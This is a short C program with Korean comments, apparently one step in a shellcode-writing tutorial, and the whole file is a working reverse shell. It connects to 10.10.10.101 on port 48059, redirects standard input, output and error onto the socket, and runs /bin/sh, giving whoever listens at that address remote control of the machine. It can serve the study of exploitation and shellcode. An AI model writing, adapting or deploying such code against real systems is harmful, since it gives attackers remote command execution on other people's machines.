#include<sys/socket.h>	// 앞과 마찬가지 헤더 파일 포함
#include<netinet/in.h>

int main()
{
	char * shell[2];
	int soc,remote;			// 지난번과 같은 선언
	struct sockaddr_in serv_addr;

	serv_addr.sin_family=2;		// sockaddr_in과 같은 설정
	serv_addr.sin_addr.s_addr=0x650A0A0A;	//10.10.10.101
	serv_addr.sin_port=0xBBBB;	// port 48059
	soc=socket(2,1,0);
	remote = connect(soc, (struct sockaddr*)&serv_addr,0x10);
	dup2(soc,0);			// 바뀐 부분 확인, 소켓에 복사
	dup2(soc,1);			// 바뀐 부분 확인, 소켓에 복사
	dup2(soc,2);			// 바뀐 부분 확인, 소켓에 복사
	shell[0]="/bin/sh";		// execve에 대한 일반적인 설정
	shell[1]=0;
	execve(shell[0],shell,0);	// 실행
}
